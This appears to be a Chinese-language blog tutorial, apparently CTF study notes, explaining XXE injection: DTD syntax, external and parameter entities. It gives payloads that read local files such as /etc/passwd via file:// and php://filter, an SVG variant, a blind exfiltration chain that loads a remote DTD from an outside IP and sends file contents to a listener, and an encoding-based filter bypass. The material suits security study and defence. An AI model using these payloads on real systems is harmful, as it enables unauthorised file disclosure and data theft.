---
title: XXE
date: 2023-05-20 23:48:39
categories:
- 网络安全
tags:
- web 
description: |
    外部实体注入,xml漏洞
---
>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 外部实体 ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(盯好外部实体就行了)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面(这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到)

XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，...），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，...），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。

在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。

### 基础

XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子

```xml
<?xml version="1.0"?>//这一行是 XML 文档定义
<!DOCTYPE message [
<!ELEMENT message (receiver ,sender ,header ,msg)>
<!ELEMENT receiver (#PCDATA)>
<!ELEMENT sender (#PCDATA)>
<!ELEMENT header (#PCDATA)>
<!ELEMENT msg (#PCDATA)>
```

与之对应

```xml
<message>
<receiver>Myself</receiver>
<sender>Someone</sender>
<header>TheReminder</header>
<msg>This is an amazing book</msg>
</message>
```

除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "test" >]>
```

这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 & 符号进行引用），那么 XML 就可以写成这样

```xml
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```

我们使用 &xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &xxe 就会被 "test" 替换

#### 实体

上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（方便永远是安全的敌人）

当然，还有一种引用方式是使用 引用公用 DTD 的方法，语法如下：

`<!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>`

- 通用实体
用 &实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE updateProfile [<!ENTITY file SYSTEM "file:///c:/windows/win.ini"> ]> 
<updateProfile>  
    <firstname>Joe</firstname>  
    <lastname>&file;</lastname>  
    ... 
</updateProfile>
```

- 参数实体
(1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用
(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体
(3)和通用实体一样，参数实体也可以外部引用

```xml
<!ENTITY % an-element "<!ELEMENT mytag (subtag)>"> 
<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
%an-element; %remote-dtd;
```

参数实体在我们 Blind XXE 中起到了至关重要的作用

### 我们能做什么

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```

#### 有回显读本地敏感文件(Normal XXE)

看不懂

`<!DOCTYPE 根标签名 SYSTEM "文件名">`

DTD实体是用于定义引用文本或字符的快捷方式的变量，可内部声明或外部引用。

约束通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合：
`<!ELEMENT 标签名 ANY>`

php

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY>
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">]>
<creds>
<user>&xxe;</user>
</creds>
```

file协议

```xml
<?xml version="1.0"?>
<!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<catalog>
     <core id="test101">
       <description>&xxe;</description>
    </core>
</catalog>
```

svg格式

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "要读取的文件路径" >
]>
<svg height="100" width="1000">
    <text x="10" y="20">&file;</text>
</svg>
```

数据外带

```xml
<!DOCTYPE root [ 
<!ENTITY % remote SYSTEM "http://174.1.66.167/shell.dtd">
%remote;
]>

shell.dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://127.0.0.1:5555/?flag=%file;'>">
%int;
%send;
```

xxe绕过

当只过滤了SYSTEM，PUBLIC等关键字时，可用双重实体编码绕过

```xml
<?xml version="1.0"?>

<!DOCTYPE GVI [

    <!ENTITY % xml "&#60;&#33;&#69;&#78;&#84;&#73;&#84;&#89;&#32;&#120;&#120;&#101;&#32;&#83;&#89;&#83;&#84;&#69;&#77;&#32;&#34;&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#102;&#108;&#97;&#103;&#46;&#116;&#120;&#116;&#34;&#32;&#62;&#93;&#62;&#10;&#60;&#99;&#111;&#114;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#62;&#38;&#120;&#120;&#101;&#59;&#60;&#47;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#62;&#10;&#60;&#47;&#99;&#111;&#114;&#101;&#62;">

    %xml;
```

即为在xml实体中再定义一次xml，可成功被解析，支持dtd数据外带

```xml
<!ENTITY xxe SYSTEM "file:///flag.txt" >]>
<core>
      <message>&xxe;</message>
</core>
```
